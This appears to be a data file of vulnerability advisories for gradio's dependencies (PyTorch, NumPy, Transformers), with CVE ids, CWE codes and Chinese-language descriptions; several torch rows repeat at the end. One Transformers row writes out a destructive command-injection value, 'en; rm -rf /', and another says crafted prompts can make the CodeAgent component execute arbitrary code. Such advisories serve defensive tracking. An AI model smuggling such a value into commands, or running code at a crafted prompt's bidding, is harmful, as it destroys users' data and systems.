gradio-app_gradio,torch,,True,CVE-2024-31580,CWE-122,2024-04-17,PyTorch是一个开源的Python包，主要用于张量计算和动态神经网络，并且具有强大的GPU加速功能。在v2.2.0之前的版本中，/runtime/vararg_functions.cpp组件中存在堆缓冲区溢出漏洞。由于函数的大小检查不当，攻击者可以通过提供精心构造的输入导致拒绝服务(DoS)，甚至可能执行任意代码。,2,0
gradio-app_gradio,torch,,True,CVE-2024-31583,CWE-416,2024-04-17,PyTorch 是一个以开源方式提供的 Python 库，专门用于神经网络构建与张量计算，具备强大的 GPU 加速能力。此漏洞涉及内存的释放后重用，位于 torch/csrc/jit/mobile/interpreter.cpp 组件中，由于内存管理不当可能导致此问题。攻击者可通过该漏洞执行任意代码或引发拒绝服务攻击。,2,0
gradio-app_gradio,torch,,True,CVE-2024-48063,CWE-502,2024-10-29,<p>PyTorch是一个由PyTorch开源社区提供的常用机器学习框架，广泛应用于深度学习和人工智能开发。此漏洞在PyTorch版本2.4.1及之前的版本中发现，该漏洞源于用于分布式RPC任务的RemoteModule模块。当应用程序允许从未经验证的来源加载和执行代码时，会导致远程代码执行漏洞。此漏洞会使攻击者能够在没有适当权限或安全审查的情况下执行任意代码。</p>,1,1
gradio-app_gradio,torch,,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
gradio-app_gradio,torch,,True,CVE-2024-7804,CWE-502,,PyTorch 是一个开源的 Python 深度学习框架，广泛用于机器学习和人工智能应用。该框架的 RPC 组件 (torch.distributed.rpc) 在 2.3.1 及其之前的版本中存在反序列化漏洞。该漏洞源于在反序列化 PythonUDF 对象时缺乏安全验证，攻击者能够通过发送恶意序列化的 PythonUDF 对象来远程执行任意代码，从而在主节点上实现远程代码执行 (RCE)。,1,1
gradio-app_gradio,torch,,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
gradio-app_gradio,torch,,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
gradio-app_gradio,torch,,True,CVE-2024-31584,CWE-125,2024-04-19,"PyTorch是PyTorch开源的一个 Python 包。
Pytorch v2.2.0之前版本存在安全漏洞，该漏洞源于组件 torch/csrc/jit/mobile/flatbuffer_loader.cpp存在越界读取漏洞。",3,0
gradio-app_gradio,torch,,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
gradio-app_gradio,torch,,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
gradio-app_gradio,torch,,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
gradio-app_gradio,torch,,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,transformers,,True,,CWE-601,2022-11-01,"## Overview
[transformers](https://pypi.org/project/transformers) is a State-of-the-art Machine Learning for JAX, PyTorch and TensorFlow

Affected versions of this package are vulnerable to Open Redirect due to referencing an obsolete link.
## Remediation
Upgrade `transformers` to version 4.23.0 or higher.
## References
- [GitHub Commit](https://github.com/huggingface/transformers/commit/ce2620194b4a8f070cd29504d34a79758affdf95)
- [GitHub PR](https://github.com/huggingface/transformers/pull/19001)
- [GitHub Release](https://github.com/huggingface/transformers/releases/tag/v4.23.0)
",3,0
gradio-app_gradio,transformers,,True,CVE-2023-2800,CWE-377,,Hugging Face Transformers 是用于 JAX、PyTorch 和 TensorFlow 的先进自然语言处理库。该漏洞出现在 4.30.0 之前的版本中，源于使用过时的 tempfile.mktemp() 方法。该方法不安全，因为在调用 mktemp() 与文件创建之间，可能有其他进程创建同名文件。这可能导致文件可用性受干扰，并可能导致敏感信息泄露。,3,1
gradio-app_gradio,transformers,,True,CVE-2023-6730,CWE-502,,Hugging Face Transformers 是为 JAX、PyTorch 和 TensorFlow 提供的先进自然语言处理框架。此组件用于处理自然语言任务，如文本分类、翻译和问答系统等。漏洞发生在 Transformers 4.36.0 之前的版本，其 root cause 是在 `RagRetriever.from_pretrained()` 函数中，`index_name` 和 `index_path` 参数会反序列化不受信任的数据，攻击者可以远程加载恶意 pickle 文件，从而绕过文件检查并在主机上执行任意代码。反序列化是将字节序列转换为对象的过程，被用于通信和存储。此漏洞允许攻击者在未验证数据合法性的情况下进行反序列化，导致代码执行。,1,1
gradio-app_gradio,transformers,,True,CVE-2023-7018,CWE-502,,Hugging Face Transformers是一个用于JAX、PyTorch和TensorFlow的先进自然语言处理库。在受到影响的版本中，使用TransfoXLTokenizer()函数可能会自动加载恶意的vocab.pkl文件，利用pickle.load函数反序列化不受信任的数据。此漏洞源于未能充分验证反序列化的数据，使攻击者可执行任意代码，控制应用程序的状态或执行流程。,1,1
gradio-app_gradio,transformers,,True,CVE-2024-3568,CWE-502,,Hugging Face Transformers 是一个为 Jax、PyTorch 和 TensorFlow 打造的用于先进自然语言处理的库。TFPreTrainedModel 类的 load_repo_checkpoint() 函数存在反序列化不受信任数据的漏洞。该漏洞允许攻击者通过构造恶意的序列化有效负载，利用函数中的 pickle.load() 方法在处理来自可能不受信任源的数据时执行任意代码和命令。这种不安全反序列化的根本原因是缺少对输入数据的信任边界控制，以及对来源不明数据的直接反序列化处理。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-3933,CWE-1333,2025-07-11,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.50.3及之前版本存在安全漏洞，该漏洞源于DonutProcessor类的token2json方法存在正则表达式拒绝服务，可能导致服务中断。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3263,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于transformers.configuration_utils模块中get_configuration_file函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3777,CWE-20,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0及之前版本存在输入验证错误漏洞，该漏洞源于image_utils.py中URL验证不足，可能导致钓鱼攻击。",3,0
gradio-app_gradio,transformers,,True,CVE-2025-3264,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于dynamic_module_utils.py中get_imports函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-5197,CWE-1333,2025-08-06,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.51.3及之前版本存在安全漏洞，该漏洞源于正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-6921,CWE-400,2025-09-23,<p>transformers是Hugging Face开源的一个用于机器学习的应用程序。 transformers 4.53.0之前版本存在资源管理错误漏洞，该漏洞源于_do_use_weight_decay方法处理用户控制的正则表达式时存在缺陷，可能导致正则表达式拒绝服务攻击。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11394,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的自然语言处理框架。该框架提供构建和应用 Transformer 模型的丰富工具。在其模型文件处理过程中，由于缺乏对用户提供数据的充分验证，导致存在不安全反序列化漏洞，攻击者可以通过插入特制的未验证模型文件进行反序列化，进而在应用中执行任意代码。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-12720,CWE-1333,2025-03-20,Hugging Face Transformers 是一个开源的自然语言处理库，广泛应用于构建和训练先进的模型。该库支持 Jax、PyTorch 和 TensorFlow 的集成。在 tokenization_nougat_fast.py 文件中的 post_process_single() 函数存在正则表达式的处理漏洞。此漏洞由于正则表达式在特定条件下表现出指数时间复杂性，导致出现过度回溯，从而造成 CPU 使用率过高以及应用程序潜在的停机，形成拒绝服务 (DoS) 的场景。受影响的版本是 v4.46.3。,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11392,CWE-502,2024-11-22,Hugging Face Transformers 是一个开源项目，提供 Jax、PyTorch 和 TensorFlow 的自然语言处理模型库。其主要用于构建和训练深度学习模型以及处理自然语言数据。在处理配置文件时，因数据验证不当，导致可能不受信任的数据被反序列化。此漏洞的核心是缺乏对用户输入数据的充分验证，从而使得攻击者能够控制程序执行流，仅需用户访问恶意页面或打开恶意配置文件即可触发。该漏洞允许嵌入恶意代码执行，并在应用环境中获得与当前用户相同的权限。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-11393,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的先进自然语言处理库，提供各种预训练模型以支持多种自然语言处理任务。漏洞存在于模型文件解析过程中，因缺乏对用户输入数据的充分验证，导致不受信任的数据被反序列化。攻击者能利用该漏洞在受影响的安装上以当前用户权限执行任意代码。此漏洞主要影响版本低于4.48.0的转换脚本，但不影响核心库功能。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-1194,CWE-1333,2025-04-29,Hugging Face Transformers 是一个用于自然语言处理的开源库，提供了多种预训练模型以便于开发者快速构建机器学习应用。该漏洞存在于 GPT-NeoX-Japanese 模型的 `tokenization_gpt_neox_japanese.py` 文件中，具体是在 SubWordJapaneseTokenizer 类中。当正则表达式处理经过精心构造的输入时，会导致漏洞产生。根本原因在于某些条件下的正则表达式表现出指数复杂性，导致过度回溯。这可能导致 CPU 使用率升高，进而造成应用程序停机，有效地生成拒绝服务 (DoS) 场景。受影响的版本为 v4.48.1（最新）。,3,2
gradio-app_gradio,transformers,,True,CVE-2025-2099,CWE-1333,2025-05-19,<p>在huggingface/transformers版本v4.48.3的`transformers.testing_utils`模块中，`preprocess_string()`函数存在一个漏洞。该漏洞允许通过正则表达式拒绝服务（ReDoS）攻击进行利用。处理文档字符串中代码块所使用的正则表达式包含嵌套量词，导致在处理含有大量换行符的输入时发生指数级回溯。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2025-6638,CWE-1333,2025-09-12,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.52.4版本存在安全漏洞，该漏洞源于MarianTokenizer的remove_language_code方法存在正则表达式处理效率问题，可能导致正则表达式拒绝服务。",3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个支持多种任务的开源自然语言处理库，基于PyTorch和TensorFlow构建。由于在GitHub Actions工作流的分支名称未正确清理，攻击者可以利用此漏洞实现任意代码注入。当攻击者提供特制的分支名称时，可以触发不受信任的命令执行。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>HuggingFace Transformers 是一个用于自然语言处理和机器学习的开源库，提供各种工具和模型以简化开发。该库中的 load_tool 功能允许从 HuggingFace Hub 加载外部工具，但存在远程代码执行漏洞。攻击者可以在未启用 `Trust Remote Code` 的情况下，通过从恶意构建的库加载工具，导致执行任意 Python 代码。此漏洞的调用链为 `load_tool() -&gt; Tool.from_hub() -&gt; get_class_from_dynamic_module() -&gt; get_class_in_module() -&gt; importlib.import_module(module_path)`，其中的 importlib.import_module 函数在没有任何警告的情况下执行导入操作。</p>,3,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个由 Hugging Face 开发的开源自然语言处理模型库，旨在提供强大的模型以简化深度学习任务。该库中的 TransfoXLCorpus 组件存在一个远程代码执行漏洞，当用户按照 Hugging Face 的官方指导使用该模型时，恶意用户可以通过不安全的 torch.load 方法进行攻击。攻击的根本原因在于该方法在未正确处理受信任输入时，可能执行任意可执行代码。具体来说，攻击者可利用该漏洞使受害者在本地执行恶意代码，从而在系统中创建特定文件。</p>,4,1
gradio-app_gradio,transformers,,True,,,,"<p>Transformers 是一个开源的 Python 库，旨在简化和加速使用深度学习模型的自然语言处理任务。在 `build-eval-data.py` 代码片段中，使用用户提供的字符串动态生成 shell 命令。攻击者可以通过输入特定的字符或命令，利用此漏洞进行远程命令注入。例如，如果用户将变量 `src` 或 `tgt` 设置为 ""en; rm -rf /""，那么代码将生成执行 `rm -rf /` 的命令，从而导致系统数据丢失或损坏。由于缺乏对输入的处理和验证，恶意用户可以执行任意 shell 命令。</p>",1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，提供多种模型和工具以简化文本建模的过程。该库的 export 函数 TextDatasetForNextSentencePrediction() 存在一个反序列化漏洞，如果读取的文件路径为 C:/1.txt，程序将会读取当前目录中精心构造的副本。该漏洞的根本原因在于库中对输入数据的处理不当，攻击者可以借此构造恶意数据流通过反序列化执行任意命令。</p>,1,1
gradio-app_gradio,transformers,,True,CVE-2025-6051,CWE-1333,2025-09-14,<p>Hugging Face Transformers 是一个用于自然语言处理 (NLP) 的开源库，提供了许多预训练的模型和工具，广泛应用于文本分类、机器翻译、文本生成等任务。此漏洞存在于该库的 `EnglishNormalizer` 类的 `normalize_numbers()` 方法中。该方法用于对数字字符串进行归一化处理，但在处理特制的长数字序列时，由于正则表达式匹配效率低下，会导致 CPU 资源过度消耗。攻击者可以通过向应用程序发送特制的输入数据，触发该漏洞，进而导致系统性能严重下降。</p>,3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，旨在借助深度学习模型简化文本处理任务。WaitCanDeadlock 漏洞是一种与并发相关的特定问题，通常发生在多线程系统中。当一个持有锁的线程被迫无期限地等待一个无法满足的条件时，可能导致死锁场景的发生。这种漏洞的触发条件为：使用 subprocess.Popen 启动子进程并直接调用 proc.wait()，如果子进程输出内容过大时，就可能会导致死锁，因此建议使用 proc.communicate() 方法来避免这一问题。</p>,1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个基于 Python 的开源机器学习库，专注于自然语言处理任务。该库中的 CodeAgent 组件负责生成并执行解决任务的代码。然而，由于未能对生成的代码进行检查，攻击者可以通过精心构造的提示直接执行任意代码，从而导致代码执行漏洞。攻击者无需额外的授权导入即可利用此漏洞。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个用于自然语言处理的开源Python库，能够处理预训练模型和变换器架构。当该库使用已不再安全的函数`tempfile.mktemp()`时，存在一个不安全的临时文件漏洞。由于调用`mktemp()`和随后尝试创建文件之间可能会有其他进程创建同名文件，这使得该函数不再安全。这使攻击者可以在文件打开之前影响文件内容。</p>,3,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个开源的 Python 库，用于构建和训练深度学习模型，特别是在自然语言处理方面。当用户使用 convert_maskformer_resnet_to_pytorch.py 脚本，并通过 --checkpoint_path 参数提供一个恶意的 .pkl 文件时，该脚本使用 pickle.load 进行不安全的反序列化。这使得攻击者可以在用户的系统上执行嵌入在 pickle 文件中的任意恶意代码。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源库，旨在为研究人员和开发者提供强大的工具以训练和应用转化器模型。该库中的 Transformer-XL 模型在执行反序列化操作时存在安全漏洞，具体是在 convert_transfo_xl_original_tf_checkpoint_to_pytorch.py 脚本中使用了 pickle.load，从而导致恶意的 pickle 文件可以被用来执行任意代码。如果攻击者能够控制传入的文件，他们可以创建一个恶意文件“一旦加载” 就可以在受害者系统上执行代码。该漏洞可以通过提供一个精心构造的 pickle 文件（例如，包含打开计算器应用的代码）进行利用。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>transformers 是一个开源的 Python 库，主要用于自然语言处理，具有强大的模型支持。在 utils/check_self_hosted_runner.py 文件中存在命令注入漏洞。攻击者可以通过在服务或 Web 服务器中运行该工具实现任意命令执行。该漏洞的根本原因是使用了 shell=True，在 subprocess.run 函数中直接注入用户提供的命令。利用该漏洞，攻击者可以执行任意命令，例如通过特制的命令参数获取系统敏感信息。</p>,4,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源 Python 库，旨在使机器学习模型的使用更为简单和可访问。该漏洞涉及用户在 https://huggingface.co/ 上传的个人资料图片，其 EXIF 地理位置数据未被去除。这导致任何人都可以获取用户的敏感信息，例如他们的地理位置和设备信息（如设备名称、版本、使用的软件及其版本等）。</p>,3,1
gradio-app_gradio,torch,,True,CVE-2022-45907,CWE-94,2022-11-26,PyTorch是一个开源机器学习框架，提供张量计算、构建神经网络等功能。其torch.jit.annotations.parse_type_line组件存在代码注入漏洞，原因是对eval的使用不安全，导致潜在的任意代码执行。,1,2
gradio-app_gradio,torch,,True,CVE-2024-31580,CWE-122,2024-04-17,PyTorch是一个开源的Python包，主要用于张量计算和动态神经网络，并且具有强大的GPU加速功能。在v2.2.0之前的版本中，/runtime/vararg_functions.cpp组件中存在堆缓冲区溢出漏洞。由于函数的大小检查不当，攻击者可以通过提供精心构造的输入导致拒绝服务(DoS)，甚至可能执行任意代码。,2,0
gradio-app_gradio,torch,,True,CVE-2024-31583,CWE-416,2024-04-17,PyTorch 是一个以开源方式提供的 Python 库，专门用于神经网络构建与张量计算，具备强大的 GPU 加速能力。此漏洞涉及内存的释放后重用，位于 torch/csrc/jit/mobile/interpreter.cpp 组件中，由于内存管理不当可能导致此问题。攻击者可通过该漏洞执行任意代码或引发拒绝服务攻击。,2,0
gradio-app_gradio,torch,,True,CVE-2024-48063,CWE-502,2024-10-29,<p>PyTorch是一个由PyTorch开源社区提供的常用机器学习框架，广泛应用于深度学习和人工智能开发。此漏洞在PyTorch版本2.4.1及之前的版本中发现，该漏洞源于用于分布式RPC任务的RemoteModule模块。当应用程序允许从未经验证的来源加载和执行代码时，会导致远程代码执行漏洞。此漏洞会使攻击者能够在没有适当权限或安全审查的情况下执行任意代码。</p>,1,1
gradio-app_gradio,torch,,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
gradio-app_gradio,torch,,True,CVE-2024-7804,CWE-502,,PyTorch 是一个开源的 Python 深度学习框架，广泛用于机器学习和人工智能应用。该框架的 RPC 组件 (torch.distributed.rpc) 在 2.3.1 及其之前的版本中存在反序列化漏洞。该漏洞源于在反序列化 PythonUDF 对象时缺乏安全验证，攻击者能够通过发送恶意序列化的 PythonUDF 对象来远程执行任意代码，从而在主节点上实现远程代码执行 (RCE)。,1,1
gradio-app_gradio,torch,,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
gradio-app_gradio,torch,,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
gradio-app_gradio,torch,,True,CVE-2024-31584,CWE-125,2024-04-19,"PyTorch是PyTorch开源的一个 Python 包。
Pytorch v2.2.0之前版本存在安全漏洞，该漏洞源于组件 torch/csrc/jit/mobile/flatbuffer_loader.cpp存在越界读取漏洞。",3,0
gradio-app_gradio,torch,,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
